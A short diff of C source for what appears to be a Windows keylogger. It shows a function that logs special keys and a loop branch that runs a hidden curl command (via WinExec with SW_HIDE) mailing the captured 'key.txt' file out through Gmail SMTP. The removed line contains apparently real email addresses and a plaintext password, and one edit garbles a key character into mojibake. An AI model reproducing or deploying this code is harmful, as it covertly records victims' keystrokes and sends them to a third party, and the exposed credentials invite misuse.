@@ -31,7 +31,7 @@ bool SpecialKeys(int S_Key)
 	case VK_RETURN:
 		LOG("\n");
 		return true;
-	case '¾':
+	case 'Â¾':
 		LOG(".");
 		return true;
 	case VK_SHIFT:
@@ -101,7 +101,7 @@ int main(void)
 		}
 		}
 		else {
-			char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"abdou.dev25@gmail.com\" --mail-rcpt \"abdou34.am@gmail.com\" --ssl -u abdou.dev25@gmail.com:abdoucsc -T \"key.txt\" -k --anyauth";
+			char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"emailfrom@gmail.com\" --mail-rcpt \"emailto@gmail.com\" --ssl -u emailfrom:password -T \"key.txt\" -k --anyauth";
     		WinExec(command, SW_HIDE);
 			stopTime = 0;
 			startTime = 0;
